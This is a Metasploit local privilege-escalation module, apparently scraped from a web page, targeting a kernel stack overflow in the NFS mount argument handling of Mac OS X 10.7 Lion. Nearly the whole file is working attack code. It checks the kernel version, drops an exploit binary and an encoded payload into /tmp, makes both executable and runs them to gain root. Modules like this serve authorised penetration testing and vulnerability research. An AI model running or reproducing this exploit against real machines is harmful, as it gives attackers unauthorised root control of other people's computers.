# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;rex&#039;

class Metasploit3 < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;          => &#039;Mac OS X NFS Mount Privilege Escalation Exploit&#039;,
      &#039;Description&#039;   => %q{
        This exploit leverage a stack overflow vulnerability to escalate privileges.
        The vulnerable function nfs_convert_old_nfs_args does not verify the size
        of a user-provided argument before copying it to the stack. As a result by
        passing a large size, a local user can overwrite the stack with arbitrary
        content.

        Mac OS X Lion Kernel <= xnu-1699.32.7 except xnu-1699.24.8 are affected.
      },
      &#039;License&#039;       => MSF_LICENSE,
      &#039;Author&#039;        =>
        [
          &#039;Kenzley Alphonse&#039;, # discovery and a very well-written exploit
          &#039;joev&#039; # msf module
        ],
      &#039;References&#039;    =>
        [
          [ &#039;EDB&#039;, &#039;32813&#039; ]
        ],
      &#039;Platform&#039;      => &#039;osx&#039;,
      &#039;Arch&#039;          => [ ARCH_X86_64 ],
      &#039;Targets&#039;       => [
        [ &#039;Mac OS X 10.7 Lion x64 (Native Payload)&#039;,
          {
            &#039;Platform&#039; => &#039;osx&#039;,
            &#039;Arch&#039; => ARCH_X86_64
          }
        ]
      ],
      &#039;DefaultTarget&#039; => 0,
      &#039;DisclosureDate&#039; => &#039;Apr 11 2014&#039;
    ))
  end

  def check
    if ver_lt(xnu_ver, "1699.32.7") and xnu_ver.strip != "1699.24.8"
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    osx_path = File.join(Msf::Config.install_root, &#039;data&#039;, &#039;exploits&#039;, &#039;osx&#039;)
    file = File.join(osx_path, &#039;nfs_mount_priv_escalation.bin&#039;)
    exploit = File.read(file)
    pload   = Msf::Util::EXE.to_osx_x64_macho(framework, payload.encoded)
    tmpfile = "/tmp/#{Rex::Text::rand_text_alpha_lower(12)}"
    payloadfile = "/tmp/#{Rex::Text::rand_text_alpha_lower(12)}"

    print_status "Writing temp file... #{tmpfile}"
    write_file(tmpfile, exploit)
    register_file_for_cleanup(tmpfile)

    print_status "Writing payload file... #{payloadfile}"
    write_file(payloadfile, pload)
    register_file_for_cleanup(payloadfile)

    print_status "Executing payload..."
    cmd_exec("chmod +x #{tmpfile}")
    cmd_exec("chmod +x #{payloadfile}")
    cmd_exec("#{tmpfile} #{payloadfile}")
  end

  def xnu_ver
    m = cmd_exec("uname -a").match(/xnu-([0-9\.~]*)/)
    m && m[1]
  end

  def ver_lt(a, b)
    Gem::Version.new(a.gsub(/~.*?$/,&#039;&#039;)) < Gem::Version.new(b.gsub(/~.*?$/,&#039;&#039;))
  end

end

